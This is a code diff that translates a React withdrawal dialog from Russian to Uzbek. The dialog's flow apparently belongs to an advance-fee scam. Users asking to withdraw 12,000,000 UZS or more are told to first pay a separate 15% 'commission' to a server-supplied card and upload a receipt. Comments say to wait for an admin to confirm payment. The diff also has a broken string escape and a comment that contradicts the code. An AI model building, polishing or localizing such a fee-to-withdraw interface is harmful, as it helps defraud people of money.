@@ -153,12 +153,12 @@ const WithdrawModal = ({ isOpen, onClose }) => {
     
     // Проверки
     if (withdrawAmount < 12000000) {
-      alert('Минимальная сумма вывода: 12,000,000 UZS');
+      alert('Eng kam yechish summasi: 12,000,000 UZS');
       return;
     }
 
     if (totalAmount > userBalance) {
-      alert(`Недостаточно средств на балансе!\n\nЗапрошено: ${withdrawAmount.toLocaleString()} UZS\nКомиссия: ${(withdrawAmount * 0.15).toLocaleString()} UZS\nИтого: ${totalAmount.toLocaleString()} UZS\nВаш баланс: ${userBalance.toLocaleString()} UZS`);
+      alert(`Balansda mablag‘ yetarli emas!\n\So‘ralgan: ${withdrawAmount.toLocaleString()} UZS\nKomissiya: ${(withdrawAmount * 0.15).toLocaleString()} UZS\nJami: ${totalAmount.toLocaleString()} UZS\nSizning balansingiz: ${userBalance.toLocaleString()} UZS`);
       return;
     }
 
@@ -210,7 +210,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
       const data = await response.json();
 
       if (response.ok) {
-        alert('Запрос на вывод отправлен! Средства поступят в течение 30 минут.');
+        alert('Pul yechish so‘rovi yuborildi! Mablag‘ 30 daqiqa ichida o‘tkaziladi.');
         // 🔹 НЕ ЗАКРЫВАЕМ МОДАЛКУ, оставляем окно комиссии открытым
         onClose(); // 🔹 УБИРАЕМ эту строку
         
@@ -225,11 +225,11 @@ const WithdrawModal = ({ isOpen, onClose }) => {
         // 🔹 ЖДЕМ ПОДТВЕРЖДЕНИЯ ОПЛАТЫ ОТ АДМИНА
         // Здесь можно добавить опрос сервера на статус оплаты
       } else {
-        alert(data.message || 'Ошибка при запросе вывода');
+        alert(data.message || 'Pul yechish so‘rovida xatolik');
       }
     } catch (error) {
       console.error('Error:', error);
-      alert('Ошибка соединения с сервером');
+        alert('Server bilan ulanishda xatolik');
     } finally {
       setLoading(false);
     }
@@ -252,7 +252,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
           )}*/}
           <h2 className="withdraw-modal-title">
             <CreditCard className="withdraw-modal-icon" />
-            {step === 1 ? 'Вывод средств' : 'Оплата комиссии'}
+            {step === 1 ? 'Pul yechish' : 'Komissiyani to‘lash'}
           </h2>
           <button onClick={onClose} className="close-button">
             <X size={20} />
@@ -262,20 +262,20 @@ const WithdrawModal = ({ isOpen, onClose }) => {
         {step === 1 ? (
           <form onSubmit={handleStep1Submit} className="withdraw-form">
             <div className="balance-info">
-              💰 Ваш баланс: <strong>{userBalance.toLocaleString()} UZS</strong>
+              💰 Sizning balansingiz: <strong>{userBalance.toLocaleString()} UZS</strong>
             </div>
 
             <div className="min-amount-info">
-              💸 Вывод от <strong>12,000,000 UZS</strong>
+              💸 Kiriting <strong>12,000,000 UZS</strong>
             </div>
 
             <div className="form-group">
-              <label className="form-label">Сумма вывода (UZS)</label>
+              <label className="form-label">Yechib olinadigan summa (UZS)</label>
               <input
                 type="number"
                 value={amount}
                 onChange={(e) => setAmount(e.target.value)}
-                placeholder="Введите сумму от 12,000,000"
+                placeholder="12,000,000 dan kiriting"
                 className="form-input"
                 min="12000000"
                 step="1000"
@@ -287,7 +287,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
             {amount && parseFloat(amount) >= 12000000 && (
               <div className="calculation-preview">
                 <div className="calculation-row">
-                  <span>Сумма вывода:</span>
+                  <span>Yechib olinadigan summa:</span>
                   <span>{parseFloat(amount).toLocaleString()} UZS</span>
                 </div>
                 {/*<div className="calculation-row">
@@ -295,17 +295,17 @@ const WithdrawModal = ({ isOpen, onClose }) => {
                   <span>{commissionAmount.toLocaleString()} UZS</span>
                 </div>*/}
                 <div className="calculation-row total">
-                  <span>Итого к списанию:</span>
+                  <span>Jami yechish summasi:</span>
                   <span>{safeAmount.toLocaleString()} UZS</span>
                 </div>
                 <div className={`balance-check ${safeAmount <= userBalance ? 'sufficient' : 'insufficient'}`}>
-                  {safeAmount <= userBalance ? '✅ Достаточно средств' : '❌ Недостаточно средств'}
+                  {safeAmount <= userBalance ? '✅ Mablag‘ yetarli' : '❌ Mablag‘ yetarli emas'}
                 </div>
               </div>
             )}
 
             <div className="form-group">
-              <label className="form-label">Номер карты</label>
+              <label className="form-label">Karta raqami</label>
               <input
                 type="text"
                 value={cardNumber}
@@ -317,12 +317,12 @@ const WithdrawModal = ({ isOpen, onClose }) => {
             </div>
 
             <div className="form-group">
-              <label className="form-label">Имя и фамилия</label>
+              <label className="form-label">Ism va familiya</label>
               <input
                 type="text"
                 value={fullName}
                 onChange={(e) => setFullName(e.target.value)}
-                placeholder="Введите имя и фамилию как на карте"
+                placeholder="Kartadagi ism va familiyani kiriting"
                 className="form-input"
                 required
               />
@@ -333,7 +333,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
               className="submit-button primary"
               disabled={amount && safeAmount > userBalance}
             >
-              Продолжить
+              Davom etish
             </button>
           </form>
         ) : (
@@ -344,37 +344,37 @@ const WithdrawModal = ({ isOpen, onClose }) => {
 
             <div className="calculation-section">
               <div className="calculation-row">
-                <span>Сумма вывода:</span>
+                <span>Yechib olinadigan summa:</span>
                 <span>{safeAmount.toLocaleString()} UZS</span>
               </div>
               <div className="calculation-row">
-                <span>Комиссия (15%):</span>
+                <span>Komissiya (15%):</span>
                 <span>{safeCommission.toLocaleString()} UZS</span>
               </div>
               <div className="calculation-row total">
-                <span>К оплате комиссии:</span>
+                <span>Komissiya uchun to‘lov:</span>
                 <span>{safeCommission.toLocaleString()} UZS</span>
               </div>
             </div>
 
 
             <div className="payment-details">
-              <p className="details-label">Реквизиты для оплаты комиссии:</p>
+              <p className="details-label">Komissiyani to‘lash uchun rekvizitlar:</p>
               <div className="card-number">
-                💳 Карта: {cardLoading ? "Загрузка..." : cardNumber}
+                💳 Karta: {cardLoading ? "Yuklanmoqda..." : cardNumber}
               </div>
               <div className="card-holder">
-                👤 Владелец: {cardLoading ? "Загрузка..." : cardHolderName}
+                👤 Ega: {cardLoading ? "Yuklanmoqda..." : cardHolderName}
               </div>
             </div>
 
             <div className="file-section">
               <p className="file-warning">
-                ⚠️ После оплаты комиссии отправьте квитанцию (чек) ОБЯЗАТЕЛЬНО
+                ⚠️ Komissiyani to‘laganingizdan so‘ng kvitansiyani (chekni) ALBATTA yuboring
               </p>
               <label className="file-upload">
                 <Upload className="upload-icon" />
-                <span>{file ? file.name : "Прикрепить квитанцию об оплате комиссии"}</span>
+                <span>{file ? file.name : "Komissiya to‘lovi kvitansiyasini biriktiring"}</span>
                 <input 
                   type="file" 
                   onChange={handleFileChange}
@@ -386,7 +386,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
             </div>
 
             <button type="submit" className="submit-button primary" disabled={loading}>
-              {loading ? 'Отправка...' : 'Оплатить комиссию и вывести'}
+              {loading ? 'Yuborilmoqda...' : 'Komissiyani to‘lash va yechib olish'}
             </button>
           </form>
         )}
